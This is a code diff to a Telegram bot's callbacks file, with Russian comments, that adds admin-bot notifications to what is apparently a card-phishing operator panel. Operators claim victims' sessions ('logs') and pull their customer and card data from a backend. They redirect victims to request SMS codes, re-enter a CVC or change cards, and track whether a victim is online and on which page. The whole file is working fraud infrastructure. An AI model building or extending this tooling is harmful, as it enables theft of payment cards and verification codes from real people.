@@ -1,3 +1,5 @@
+# [file name]: callbacks.py (обновленная версия)
+# [file content begin]
 from aiogram import Dispatcher, types, F
 from aiogram.exceptions import TelegramForbiddenError
 import httpx
@@ -11,6 +13,9 @@ sys.path.append(os.path.join(os.path.dirname(__file__), '../..'))
 from database.crud import get_log_by_session, update_log_taken_by, find_card_duplicates, release_log
 from api.handy_api import get_card_info, format_card_info
 from bot.keyboards import get_management_keyboard, get_taken_keyboard, get_take_log_keyboard, get_revoked_keyboard
+
+# Импортируем функции уведомлений для админского бота
+from admin_bot import notify_log_taken, notify_log_taken_over, notify_action, notify_user_response
 import config
 
 async def take_log(callback: types.CallbackQuery):
@@ -39,6 +44,10 @@ async def take_log(callback: types.CallbackQuery):
     
     await callback.bot.send_message(config.GROUP_ID, group_message)
 
+    # Уведомляем админский бот
+    await notify_log_taken(booking_id, client_id, username, callback.from_user.id)
+
+    # Остальной код без изменений...
     async with httpx.AsyncClient() as client:
         customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
         card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
@@ -130,10 +139,13 @@ async def take_from_user(callback: types.CallbackQuery):
     
     await callback.bot.send_message(config.GROUP_ID, group_message)
     
+    # Уведомляем админский бот о перехвате
+    await notify_log_taken_over(booking_id, client_id, new_username, callback.from_user.id, previous_owner_id)
+    
     # Забираем лог себе
     update_log_taken_by(session_id, callback.from_user.id)
     
-    # Получаем данные для отправки новому владельцу
+    # Остальной код без изменений...
     async with httpx.AsyncClient() as client:
         customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
         card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
@@ -213,56 +225,38 @@ async def take_from_user(callback: types.CallbackQuery):
     
     await callback.answer("✅ Лог успешно перехвачен", show_alert=True)
 
-async def check_online_status(callback: types.CallbackQuery):
-    session_id = callback.data.split(":")[1]
-    
-    log = get_log_by_session(session_id)
-    if not log or log['taken_by'] != callback.from_user.id:
-        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
-        return
-    
-    try:
-        async with httpx.AsyncClient() as client:
-            response = await client.get(f"{config.SERVER_URL}/check-online-status/{session_id}")
-            
-            if response.status_code == 200:
-                data = response.json()
-                booking_id = log['booking_id']
-                client_id = log['client_id']
-                
-                if data.get("online"):
-                    current_page = data.get("currentPageDisplay", "Unknown")
-                    message = (
-                        f"🆔 #{booking_id} || #{client_id}\n\n"
-                        f"🟢 Пользователь ОНЛАЙН\n\n"
-                        f"📍 Текущая страница: {current_page}\n"
-                        f"⏰ Последняя активность: только что"
-                    )
-                else:
-                    last_known_page = data.get("lastKnownPageDisplay", "неизвестно")
-                    last_seen = data.get("lastSeen", "неизвестно")
-                    message = (
-                        f"🆔 #{booking_id} || #{client_id}\n\n"
-                        f"🔴 Пользователь ОФФЛАЙН\n\n"
-                        f"📄 Последняя известная страница: {last_known_page}\n"
-                        f"⏰ Последняя активность: {last_seen}"
-                    )
-                await callback.message.answer(message)
-            else:
-                await callback.message.answer("❌ Не удалось получить статус пользователя")
-                
-    except Exception as e:
-        print(f"Error checking online status: {e}")
-        await callback.message.answer("❌ Ошибка соединения с сервером")
-    
-    await callback.answer()
-
 async def handle_redirect_action(callback: types.CallbackQuery):
     action, session_id = callback.data.split(":")
     
     log = get_log_by_session(session_id)
     if not log or log['taken_by'] != callback.from_user.id:
         await callback.answer("У вас нет доступа к этому логу", show_alert=True)
+        return
+    
+    # Определяем текстовое описание действия
+    action_descriptions = {
+        "balance": "💰 Проверка баланса",
+        "sms": "📞 Запрос SMS кода", 
+        "change": "🔄 Смена карты",
+        "success": "✅ Успешная оплата",
+        "wrong_cvc": "❌ Ошибка CVC",
+        "wrong_sms": "❌ Ошибка SMS",
+        "prepaid": "❌ Prepaid карта",
+        "check_online": "🔍 Проверка онлайн статуса"
+    }
+    
+    action_text = action_descriptions.get(action, action)
+    
+    # Уведомляем админский бот о действии
+    booking_id = log['booking_id'] or "N/A"
+    client_id = log['client_id'] or "N/A"
+    username = callback.from_user.username or "без username"
+    
+    await notify_action(booking_id, client_id, username, callback.from_user.id, action, action_text)
+    
+    # Обработка проверки онлайн статуса (остается без изменений)
+    if action == "check_online":
+        await check_online_status(callback)
         return
     
     endpoints = {
@@ -301,16 +295,75 @@ async def handle_redirect_action(callback: types.CallbackQuery):
                     messages[action]
                 )
                 
+                # Уведомляем админский бот о ответе пользователя
+                await notify_user_response(booking_id, client_id, username, callback.from_user.id, messages[action])
+                
             else:
-                await callback.message.answer(
-                    "❌ Ошибка перенаправления"
-                )
+                error_msg = "❌ Ошибка перенаправления"
+                await callback.message.answer(error_msg)
+                await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
                 
     except Exception as e:
         print(f"Error redirecting user: {e}")
-        await callback.message.answer(
-            "❌ Ошибка соединения с сервером"
-        )
+        error_msg = "❌ Ошибка соединения с сервером"
+        await callback.message.answer(error_msg)
+        await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
+
+# Остальные функции без изменений...
+async def check_online_status(callback: types.CallbackQuery):
+    session_id = callback.data.split(":")[1]
+    
+    log = get_log_by_session(session_id)
+    if not log or log['taken_by'] != callback.from_user.id:
+        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
+        return
+    
+    try:
+        async with httpx.AsyncClient() as client:
+            response = await client.get(f"{config.SERVER_URL}/check-online-status/{session_id}")
+            
+            if response.status_code == 200:
+                data = response.json()
+                booking_id = log['booking_id']
+                client_id = log['client_id']
+                
+                if data.get("online"):
+                    current_page = data.get("currentPageDisplay", "Unknown")
+                    message = (
+                        f"🆔 #{booking_id} || #{client_id}\n\n"
+                        f"🟢 Пользователь ОНЛАЙН\n\n"
+                        f"📍 Текущая страница: {current_page}\n"
+                        f"⏰ Последняя активность: только что"
+                    )
+                else:
+                    last_known_page = data.get("lastKnownPageDisplay", "неизвестно")
+                    last_seen = data.get("lastSeen", "неизвестно")
+                    message = (
+                        f"🆔 #{booking_id} || #{client_id}\n\n"
+                        f"🔴 Пользователь ОФФЛАЙН\n\n"
+                        f"📄 Последняя известная страница: {last_known_page}\n"
+                        f"⏰ Последняя активность: {last_seen}"
+                    )
+                await callback.message.answer(message)
+                
+                # Уведомляем админский бот о проверке статуса
+                username = callback.from_user.username or "без username"
+                await notify_action(booking_id, client_id, username, callback.from_user.id, "check_online", "🔍 Проверка онлайн статуса")
+                await notify_user_response(booking_id, client_id, username, callback.from_user.id, message)
+            else:
+                error_msg = "❌ Не удалось получить статус пользователя"
+                await callback.message.answer(error_msg)
+                username = callback.from_user.username or "без username"
+                await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
+                
+    except Exception as e:
+        print(f"Error checking online status: {e}")
+        error_msg = "❌ Ошибка соединения с сервером"
+        await callback.message.answer(error_msg)
+        username = callback.from_user.username or "без username"
+        await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
+    
+    await callback.answer()
 
 def register_callbacks(dp: Dispatcher):
     dp.callback_query.register(take_log, F.data.startswith("take:"))
@@ -323,3 +376,4 @@ def register_callbacks(dp: Dispatcher):
     dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_cvc:")) 
     dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_sms:"))
     dp.callback_query.register(handle_redirect_action, F.data.startswith("prepaid:"))
+# [file content end]
